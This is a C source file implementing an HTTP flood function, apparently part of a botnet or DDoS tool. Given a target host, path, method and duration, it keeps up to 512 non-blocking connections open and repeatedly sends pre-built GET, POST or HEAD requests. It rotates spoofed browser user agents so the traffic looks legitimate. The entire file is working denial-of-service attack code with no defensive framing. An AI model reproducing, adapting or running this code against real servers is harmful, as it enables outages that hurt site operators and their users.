#define _GNU_SOURCE

#include <stdio.h>
#include <string.h>
#include <time.h>
#include <fcntl.h>
#include <errno.h>
#include <unistd.h>
#include <sys/time.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <ctype.h>

#include "http_attack.h"
#include "../headers/protocol.h"

#define MAX_CONNECTIONS 512
#define MAX_REQUEST_SIZE 2048

typedef enum {
    HTTP_GET = 0,
    HTTP_POST,
    HTTP_HEAD,
    HTTP_PUT,
    HTTP_DELETE,
    HTTP_PATCH,
    HTTP_OPTIONS,
    HTTP_METHOD_COUNT
} http_method_t;

static const char* METHOD_NAMES[] = {
    "GET", "POST", "HEAD", "PUT", "DELETE", "PATCH", "OPTIONS"
};

static const char* USER_AGENTS[] = {
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0"
};
#define NUM_USER_AGENTS (sizeof(USER_AGENTS) / sizeof(USER_AGENTS[0]))

static void set_socket_options(int sock) {
    int flags = fcntl(sock, F_GETFL, 0);
    fcntl(sock, F_SETFL, flags | O_NONBLOCK);

    int sndbuf = 512 * 1024;
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
}

static int parse_method_option(const char* method_str) {
    if (!method_str) return -1;

    char lower[16] = {0};
    int i;
    for (i = 0; i < 15 && method_str[i]; i++) {
        lower[i] = tolower(method_str[i]);
    }

    if (strcmp(lower, "get") == 0) return HTTP_GET;
    if (strcmp(lower, "post") == 0) return HTTP_POST;
    if (strcmp(lower, "head") == 0) return HTTP_HEAD;
    if (strcmp(lower, "put") == 0) return HTTP_PUT;
    if (strcmp(lower, "delete") == 0) return HTTP_DELETE;
    if (strcmp(lower, "patch") == 0) return HTTP_PATCH;
    if (strcmp(lower, "options") == 0) return HTTP_OPTIONS;

    return -1;
}

static int build_request(char* buf, size_t buf_size, http_method_t method,
                         const char* host, const char* path, const char* user_agent) {
    int len = 0;

    switch (method) {
        case HTTP_POST:
        case HTTP_PUT:
        case HTTP_PATCH:
            len = snprintf(buf, buf_size,
                "%s %s HTTP/1.1\r\n"
                "Host: %s\r\n"
                "User-Agent: %s\r\n"
                "Connection: keep-alive\r\n"
                "Content-Type: application/x-www-form-urlencoded\r\n"
                "Content-Length: 16\r\n"
                "Accept: */*\r\n"
                "Accept-Encoding: gzip, deflate\r\n"
                "\r\n"
                "data=random_data",
                METHOD_NAMES[method], path, host, user_agent);
            break;

        case HTTP_OPTIONS:
            len = snprintf(buf, buf_size,
                "%s %s HTTP/1.1\r\n"
                "Host: %s\r\n"
                "User-Agent: %s\r\n"
                "Connection: keep-alive\r\n"
                "Access-Control-Request-Method: POST\r\n"
                "Origin: http://%s\r\n"
                "\r\n",
                METHOD_NAMES[method], path, host, user_agent, host);
            break;

        default:
            len = snprintf(buf, buf_size,
                "%s %s HTTP/1.1\r\n"
                "Host: %s\r\n"
                "User-Agent: %s\r\n"
                "Connection: keep-alive\r\n"
                "Accept: */*\r\n"
                "Accept-Encoding: gzip, deflate\r\n"
                "\r\n",
                METHOD_NAMES[method], path, host, user_agent);
            break;
    }

    return len;
}

void* http_attack(void* arg) {
    attack_params* params = (attack_params*)arg;
    if (!params) return NULL;

    struct sockaddr_in target_addr;
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = params->target_addr.sin_port;
    target_addr.sin_addr = params->target_addr.sin_addr;

    attack_option* domain_opt = find_option(params, OPT_DOMAIN);
    char host[256];
    if (domain_opt && domain_opt->data && domain_opt->len > 0) {
        int len = domain_opt->len < 255 ? domain_opt->len : 255;
        memcpy(host, domain_opt->data, len);
        host[len] = '\0';
    } else {
        strncpy(host, inet_ntoa(params->target_addr.sin_addr), sizeof(host) - 1);
        host[sizeof(host) - 1] = '\0';
    }

    attack_option* path_opt = find_option(params, OPT_HTTP_PATH);
    char path[512] = "/";
    if (path_opt && path_opt->data && path_opt->len > 0) {
        int len = path_opt->len < 511 ? path_opt->len : 511;
        memcpy(path, path_opt->data, len);
        path[len] = '\0';
    }

    attack_option* method_opt = find_option(params, OPT_HTTP_METHOD);
    int fixed_method = -1;
    if (method_opt && method_opt->data && method_opt->len > 0) {
        char method_str[32] = {0};
        int len = method_opt->len < 31 ? method_opt->len : 31;
        memcpy(method_str, method_opt->data, len);
        fixed_method = parse_method_option(method_str);
    }

    // Pre-build request variants: one per user agent
    // For fixed method, build NUM_USER_AGENTS variants
    // For random method, build NUM_USER_AGENTS * 3 (GET, POST, HEAD) variants
    http_method_t methods_to_prebuild[HTTP_METHOD_COUNT];
    int num_methods;

    if (fixed_method >= 0 && fixed_method < HTTP_METHOD_COUNT) {
        methods_to_prebuild[0] = (http_method_t)fixed_method;
        num_methods = 1;
    } else {
        methods_to_prebuild[0] = HTTP_GET;
        methods_to_prebuild[1] = HTTP_POST;
        methods_to_prebuild[2] = HTTP_HEAD;
        num_methods = 3;
    }

    int total_variants = num_methods * NUM_USER_AGENTS;
    char (*prebuilt_requests)[MAX_REQUEST_SIZE] = malloc(total_variants * MAX_REQUEST_SIZE);
    int prebuilt_lens[42]; // num_methods * NUM_USER_AGENTS, max 7*6=42

    if (!prebuilt_requests) return NULL;

    for (int m = 0; m < num_methods; m++) {
        for (int u = 0; u < (int)NUM_USER_AGENTS; u++) {
            int idx = m * NUM_USER_AGENTS + u;
            prebuilt_lens[idx] = build_request(
                prebuilt_requests[idx], MAX_REQUEST_SIZE,
                methods_to_prebuild[m], host, path, USER_AGENTS[u]);
        }
    }

    int sockets[MAX_CONNECTIONS] = {0};
    int active_sockets = 0;

    srand(time(NULL) ^ (unsigned int)getpid());
    time_t end_time = time(NULL) + params->duration;
    struct timeval last_cleanup = {0, 0};
    uint32_t variant_idx = 0;

    while (params->active && time(NULL) < end_time) {
        // Open connections in bulk
        while (active_sockets < MAX_CONNECTIONS) {
            int sock = socket(AF_INET, SOCK_STREAM, 0);
            if (sock < 0) break;

            set_socket_options(sock);

            int ret = connect(sock, (struct sockaddr*)&target_addr, sizeof(target_addr));
            if (ret < 0 && errno != EINPROGRESS) {
                close(sock);
                continue;
            }

            sockets[active_sockets++] = sock;
        }

        // Send pre-built requests to all active sockets (no snprintf per send)
        for (int i = 0; i < active_sockets; i++) {
            int sock = sockets[i];
            if (sock <= 0) continue;

            // Round-robin through pre-built request variants
            int vidx = variant_idx % total_variants;
            variant_idx++;

            ssize_t sent = send(sock, prebuilt_requests[vidx], prebuilt_lens[vidx],
                                MSG_NOSIGNAL | MSG_DONTWAIT);

            if (sent <= 0 && errno != EAGAIN && errno != EWOULDBLOCK) {
                close(sock);
                sockets[i] = sockets[--active_sockets];
                sockets[active_sockets] = 0;
                i--;
                continue;
            }

            // Drain any response data
            char discard[1024];
            recv(sock, discard, sizeof(discard), MSG_DONTWAIT);
        }

        // Periodic cleanup: detect dead connections via non-blocking peek
        struct timeval now;
        gettimeofday(&now, NULL);
        if (now.tv_sec - last_cleanup.tv_sec >= 1) {
            for (int i = 0; i < active_sockets; i++) {
                if (sockets[i] <= 0) continue;

                // Check for closed connection (recv returns 0 = peer closed)
                char test;
                ssize_t r = recv(sockets[i], &test, 1, MSG_PEEK | MSG_DONTWAIT);
                if (r == 0) {
                    // Peer closed
                    close(sockets[i]);
                    sockets[i] = sockets[--active_sockets];
                    sockets[active_sockets] = 0;
                    i--;
                } else if (r < 0 && errno != EAGAIN && errno != EWOULDBLOCK) {
                    // Error
                    close(sockets[i]);
                    sockets[i] = sockets[--active_sockets];
                    sockets[active_sockets] = 0;
                    i--;
                }
            }
            last_cleanup = now;
        }
    }

    for (int i = 0; i < active_sockets; i++) {
        if (sockets[i] > 0) close(sockets[i]);
    }

    free(prebuilt_requests);
    return NULL;
}
